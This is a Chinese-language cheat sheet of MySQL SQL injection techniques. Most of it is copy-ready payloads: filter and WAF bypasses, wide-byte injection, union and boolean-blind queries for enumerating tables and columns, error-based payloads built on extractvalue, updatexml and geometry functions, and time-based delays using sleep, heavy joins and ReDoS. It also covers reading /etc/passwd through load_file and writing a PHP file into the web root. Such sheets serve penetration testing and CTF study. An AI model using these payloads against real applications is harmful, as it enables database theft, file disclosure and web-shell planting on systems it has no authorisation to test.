# MYSQL injection

## 语法参考与小技巧

### 行间注释 

- `--`

  

  ```mysql
  DROP sampletable;--
  ```

- `#`

  

  ```
  DROP sampletable;#
  ```

### 行内注释

- `/*注释内容*/`

  

  ```
  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members
  ```

- `/*! MYSQL专属 */`

  

  ```
  SELECT /*!32302 1/0, */ 1 FROM tablename
  ```

## 注入常见参数 

### user()：当前数据库用户

### database()：当前数据库名

### version()：当前使用的数据库版本

### @@hostname  

### @@port 

### @@version  

### @@datadir：数据库存储数据路径

### concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password)

### group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来

### concat_ws()：用法类似

### hex() 和 unhex()：用于 hex 编码解码

### load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\

### select xxoo into outfile '路径'：权限较高时可直接写文件

## 推荐网站
 http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/

[http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/](http://p0desta.com/2018/03/29/SQL注入备忘录/)

[https://ultramangaia.github.io/blog/2018/SQL%E6%B3%A8%E5%85%A5.html](https://ultramangaia.github.io/blog/2018/SQL注入.html)

## 绕过

### 关键字 %00绕过

•SELECT :SE\x00LECT  (\x00指ASCII为0的字符） 

### 绕过逗号限制

join

### 绕过空格限制

1. /**/代替空格
2. 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格
3. 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a

### 绕过引号限制

- -- hex 编码                                               
SELECT * FROM Users WHERE username = 0x61646D696E
- -- char() 函数                                           SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)

### 绕过字符串黑名单

- SELECT 'a' 'd' 'mi' 'n';
- SELECT CONCAT('a', 'd', 'm', 'i', 'n');
- SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
- SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
- SELECT extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)
- SELECT (char(97)+char(100)+char(109)+char(105)+char(110))

### 宽字节注入 

- 作用

	- 这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。

- 原理

	- 反斜杠 \ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。

### 函数代替

- mid与substr
- limit x,x与group_cat()
- substr(,,)与substr( from x for x)
- concat

	- make_set(3,'~',version())
	- lpad((version()),20,'@')
	- repeat((version()),2)
	- 来源:http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/

### 杂

-  or <->||

- and <->&&

- 不要忘记 ^

- =<>    <=>    in/between/like

  - SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 IN (1)

  - SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 LIKE "1"

  - SELECT 1 WHERE 1 < 10 ó SELECT 1 WHERE 1 BETWEEN (0, 10)

## 注入语句备忘 

### 数据库名 

- SELECT database();
- SELECT schema_name FROM information_schema.schemata;

### 表名

- union 查询

	- select 1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出当前数据库中的表 */

- 盲注

	- AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)))>100

### 列名

- union 查询

	- UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

- 盲注

	- and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' ),1,1)))>100

- 报错

	- 利用 PROCEDURE ANALYSE()

		- -- 这个需要 web 展示页面有你所注入查询的一个字段
		- -- 获得第一个段名
		- SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()
		- -- 获得第二个段名
		- 1 LIMIT 1,1 PROCEDURE ANALYSE()
		- -- 获得第三个段名
		- 1 LIMIT 2,1 PROCEDURE ANALYSE()

### 根据列名查询所在的表

- -- 查询字段名为 username 的表

	- SELECT table_name FROM information_schema.columns WHERE column_name = 'username';

- -- 查询字段名中包含 username 的表

	- SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';

### 报错注入

- floor()

	- select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

- extractvalue()

	- select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

- updatexml()

	- select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

- geometrycollection()

	- select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

- multipoint()

	- select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

- polygon()

	- select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

- multipolygon()

	- select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

- linestring()

	- select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

- multilinestring()

	- select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

- exp()

	- select * from test where id=1 and exp(~(select * from(select user())a));

- 通过join报错爆字段

	- select * from (select * from 表名 a join 表名 b) c)  
在得到一个字段后，使用using得到下一个字段
select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  

### 基于时间的盲注

' and if(1=0,1, sleep(10)) --+    

" and if(1=0,1, sleep(10)) --+

) and if(1=0,1, sleep(10)) --+

') and if(1=0,1, sleep(10)) --+

") and if(1=0,1, sleep(10)) --+

### **MySQL**读写文件

- 一切都仅限于MySQL 5.6以前，高版本默认配置secure_file_priv为NULL，无法读写任何文件。

- LOAD_FILE 任意读文件

  - SELECT load_file('/etc/passwd');

- 在Windows下可利用UNC路径实现数据外带

  - LOAD DATA LOCAL INFILE读文件

  - LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a fields terminated by ''

- 写文件

  - SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/1.php';





## 注入类型

### 堆叠注入

select 1,2;select 2,3

### union 注入

#### 条件

- Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。

- **Union中的每个查询必须包含相同数量的列。**

- 列的数据类型必须兼容：

  -兼容指数据库可以隐式转换类型A到类型B，例如：

  - int -> double

  - int -> varchar

### 盲注

#### bool 盲注

#### 时间盲注

##### **MySQL** **时间盲注**


- BENCHMARK

- 笛卡尔积

  - If (ascii(substr((select database()),%d,1))<%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)#

  - 无法理解则请自己复习《线性代数》与《数据库系统原理》

- 正则延迟

  - select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1);

ReDOS，无法理解则请自己复习编译原理

#### 报错盲注

select * from (SELECT "E10ADC3949BA59ABBE56E057F20F883E" as password) a where IF(LEFT(password, 1) = "E", EXP(100000000000), 1);

匹配上时产生报错，没匹配上时页面正常。

这里可以用所有会产生错误的函数，而不仅仅局限于那几个会产生报错注入的函数。